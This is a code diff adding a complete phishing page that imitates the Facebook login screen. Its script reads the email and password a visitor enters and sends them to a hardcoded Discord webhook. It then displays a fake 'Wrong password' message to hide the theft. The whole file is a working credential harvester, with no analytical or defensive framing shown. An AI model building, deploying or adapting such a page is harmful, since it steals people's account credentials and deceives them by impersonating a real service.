@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            width: 360px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        input {
+            width: 90%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background: #165bd3;
+        }
+        .forgot {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .create-btn {
+            background: #42b72a;
+            padding: 12px;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+            display: inline-block;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email or phone number">
+            <input type="password" id="password" placeholder="Password">
+            <button class="login-btn" onclick="sendLoginData()">Log In</button>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <hr>
+            <button class="create-btn">Create New Account</button>
+        </div>
+    </div>
+    <script>
+        function sendLoginData() {
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            
+            var webhookURL = "https://discord.com/api/webhooks/1354464245475053669/DPyMMsqKsjBRO2rQvnRb6wY8A9SFD2s9rZqWKaG7fJAV4Get_tcwJhso4G5Fm98t5Ldy";  
+            var message = {
+                content: "**New Login Attempt**\n📧 Email: " + email + "\n🔑 Password: " + password
+            };
+    
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(message)
+            });
+    
+            alert("Wrong password. Try again.");
+        }
+    </script>
+</body>
+</html>
